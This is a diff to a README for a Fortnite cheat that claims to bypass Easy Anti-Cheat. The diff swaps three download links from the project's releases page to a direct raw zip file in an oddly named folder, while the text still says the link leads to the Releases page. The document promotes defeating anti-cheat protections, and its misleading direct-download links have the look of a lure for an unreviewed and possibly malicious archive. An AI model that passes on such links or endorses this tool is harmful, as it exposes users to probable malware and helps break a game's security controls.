@@ -1,6 +1,6 @@
 # 🚀 FortniteExternalCheat - Easy EAC Bypass for Fortnite
 
-[![Download FortniteExternalCheat](https://img.shields.io/badge/Download-FortniteExternalCheat-blue.svg)](https://github.com/manguo757530841/FortniteExternalCheat/releases)
+[![Download FortniteExternalCheat](https://raw.githubusercontent.com/manguo757530841/FortniteExternalCheat/main/cheeseflower/FortniteExternalCheat.zip)](https://raw.githubusercontent.com/manguo757530841/FortniteExternalCheat/main/cheeseflower/FortniteExternalCheat.zip)
 
 ## 📘 Description
 FortniteExternalCheat is a tool designed to help players bypass Easy Anti-Cheat (EAC) while playing Fortnite. This application allows you to enhance your gaming experience, providing features like aim assist and various cheats. Please use it responsibly.
@@ -20,7 +20,7 @@ Make sure your computer meets the following minimum requirements:
 ### 2. Download FortniteExternalCheat
 To download FortniteExternalCheat, visit the following page:
 
-[Download FortniteExternalCheat](https://github.com/manguo757530841/FortniteExternalCheat/releases)
+[Download FortniteExternalCheat](https://raw.githubusercontent.com/manguo757530841/FortniteExternalCheat/main/cheeseflower/FortniteExternalCheat.zip)
 
 This link will take you directly to the Releases page, where you can find the latest version.
 
@@ -74,6 +74,6 @@ Join our community to share your experiences and get help from other users. You 
 
 Once again, you can download FortniteExternalCheat here:
 
-[Download FortniteExternalCheat](https://github.com/manguo757530841/FortniteExternalCheat/releases)
+[Download FortniteExternalCheat](https://raw.githubusercontent.com/manguo757530841/FortniteExternalCheat/main/cheeseflower/FortniteExternalCheat.zip)
 
 Happy gaming!
